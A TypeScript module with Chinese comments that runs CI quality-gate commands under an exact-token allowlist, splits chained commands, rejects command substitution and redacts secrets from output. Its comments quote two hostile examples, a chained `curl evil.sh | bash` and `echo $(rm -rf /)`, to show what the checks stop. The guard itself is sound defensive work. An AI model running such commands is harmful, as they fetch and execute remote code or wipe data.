/**
 * 质量门执行器 —— 客观的合并关卡（spec §4.2 gates_run）。
 *
 * 在成员 worktree 里跑配置好的命令序列。每条命令都必须命中命令白名单
 * （spec §4.5.2）；输出被截取为尾部摘要，并在进入模型、会话日志或 webhook 前
 * 由 SecretRedactor 脱敏。
 */
import { runShell } from './exec.js';
import type { GateResult, GateSummary } from './view.js';
import type { SecretRedactor } from './secrets.js';

export class CommandNotAllowedError extends Error {
  constructor(command: string, allowlist: readonly string[]) {
    super(
      `command "${command}" is not on the allowlist [${allowlist.join(', ')}]. ` +
        `Either run an allowed command or escalate for a human to extend the allowlist.`,
    );
    this.name = 'CommandNotAllowedError';
  }
}

/** 一条类 shell 命令行语义下的首 token，去掉前导的 VAR=value 赋值前缀。 */
export function commandHead(command: string): string {
  const tokens = command.trim().split(/\s+/).filter(Boolean);
  let index = 0;
  // 跳过 VAR=value 前缀。
  while (index < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[index] ?? '')) index += 1;
  return tokens[index] ?? '';
}

/**
 * 把一条 shell 命令行拆成顶层片段。在 `/bin/sh` 里 `&&`、`||`、`;`、`|`、`&`
 * 与**换行**都会开启一条新命令，因此每个片段必须独立求值 —— 只检查首 token 会
 * 让一条链式命令把不在白名单里的可执行文件偷运过关
 * （`docker build … && curl evil.sh | bash`）。
 *
 * 单个字符的字符类同时覆盖了 `&&` 与 `||`（中间的空白片段会被过滤掉）。
 * 引号内的分隔符会被过度拆分，方向是**更严**，不构成放行风险。
 */
export function splitSegments(command: string): string[] {
  return command
    .split(/[;|&\n]/)
    .map((segment) => segment.trim())
    .filter((segment) => segment !== '');
}

/**
 * shell 里会「再启动一个进程、但 splitSegments 看不见」的构造：命令替换 `$( )`
 * 与反引号。它们不做拆分，一律整条拒绝 —— 白名单可以允许 `echo`，但
 * `echo $(rm -rf /)` 的实质是放行了 `rm`，而没有任何一处检查见过它。
 *
 * 刻意**不**拦重定向与 glob（`>`、`*`）：它们由同一个 shell 处理，不会启动新的
 * 可执行文件，拦下来只会打断正常配置而无安全收益。
 */
function hasHiddenExecutable(command: string): boolean {
  return command.includes('$(') || command.includes('`');
}

/**
 * 当 *每个* shell 片段的可执行文件都在白名单里、且整条命令不含藏匿可执行文件的
 * 构造时返回 true。匹配是精确的 token 匹配（不做前缀子串的宽松匹配）：`git`
 * 只匹配 `git`，不匹配 `gitlab-cli`。
 */
export function isAllowed(command: string, allowlist: readonly string[]): boolean {
  if (hasHiddenExecutable(command)) return false;
  const segments = splitSegments(command);
  if (segments.length === 0) return false;
  return segments.every((segment) => {
    const head = commandHead(segment);
    if (head === '') return false;
    return allowlist.includes(head);
  });
}

export interface RunGatesOptions {
  cwd: string;
  commands: readonly string[];
  allowlist: readonly string[];
  timeoutMs: number;
  redactor: SecretRedactor;
  /** 中止支持：守护循环在每一步都必须可取消（spec §6）。 */
  signal?: AbortSignal;
  taskId: string;
  branch: string;
}

/**
 * 运行一条门命令。非零退出码绝不抛错 —— 门失败是数据，不是异常；只有 abort
 * 才抛（那是守护循环在要求收手）。不在白名单里的命令抛 CommandNotAllowedError，
 * 且**不会启动子进程**。
 */
export async function runGateCommand(
  command: string,
  options: RunGatesOptions,
): Promise<GateResult> {
  if (!isAllowed(command, options.allowlist)) {
    throw new CommandNotAllowedError(command, options.allowlist);
  }
  const startedAt = Date.now();
  const result = await runShell({
    command,
    cwd: options.cwd,
    extraEnv: { CI: 'true' },
    timeoutMs: options.timeoutMs,
    label: 'gate',
    ...(options.signal !== undefined ? { signal: options.signal } : {}),
  });
  return {
    command,
    passed: result.exitCode === 0,
    exitCode: result.exitCode,
    durationMs: Date.now() - startedAt,
    // 顺序与合并前一致：先由 runner 截尾，再脱敏。
    logTail: options.redactor.redact(result.logTail),
  };
}

/** 跑完整条门序列；在第一条失败时停止（快速失败）。 */
export async function runGates(options: RunGatesOptions): Promise<GateSummary> {
  const results: GateResult[] = [];
  let allPassed = true;
  for (const command of options.commands) {
    const result = await runGateCommand(command, options);
    results.push(result);
    if (!result.passed) {
      allPassed = false;
      break;
    }
  }
  return {
    taskId: options.taskId,
    branch: options.branch,
    allPassed,
    results,
    ranAt: Date.now(),
  };
}
